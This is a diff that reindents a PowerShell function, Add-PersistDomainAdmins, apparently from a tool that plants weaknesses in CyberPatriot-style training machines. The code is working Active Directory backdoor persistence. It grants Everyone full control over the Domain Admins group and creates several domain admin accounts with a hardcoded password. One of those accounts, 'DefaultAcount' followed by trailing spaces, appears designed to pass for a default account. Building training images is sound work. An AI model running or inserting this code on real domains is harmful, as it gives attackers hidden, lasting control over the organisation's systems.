@@ -16,19 +16,20 @@ function Add-PersistDomainAdmins {
     
     @('a','b','c','d','e','f') | % {New-ADUser $_ -Enabled $true -AccountPassword (ConvertTo-SecureString "CyberPatriot1!" -AsPlainText -Force);Add-ADGroupMember -Identity "Domain Admins" -Members $_}
     #>
-        # $Domain = $env:USERDNSDOMAIN
-        $DefaultPartition = (Get-ADDomainController).DefaultPartition
-        dsacls "CN=Domain Admins,CN=Users,$DefaultPartition" /G EVERYONE:GA
-        @(
-            'a',
-            'b',
-            'c',
-            'd',
-            'e',
-            'f',
-            'DefaultAcount    ' # 4 spaces
-        ) | ForEach-Object {
-            New-ADUser $_ -Enabled $true -AccountPassword (ConvertTo-SecureString "CyberPatriot1!" -AsPlainText -Force)
-            Add-ADGroupMember -Identity "Domain Admins" -Members $_
-        }
+    # $Domain = $env:USERDNSDOMAIN
+    $DefaultPartition = (Get-ADDomainController).DefaultPartition
+    dsacls "CN=Domain Admins,CN=Users,$DefaultPartition" /G EVERYONE:GA
+
+    @(
+        'a',
+        'b',
+        'c',
+        'd',
+        'e',
+        'f',
+        'DefaultAcount    ' # 4 spaces
+    ) | ForEach-Object {
+        New-ADUser $_ -Enabled $true -AccountPassword (ConvertTo-SecureString "CyberPatriot1!" -AsPlainText -Force)
+        Add-ADGroupMember -Identity "Domain Admins" -Members $_
     }
+}
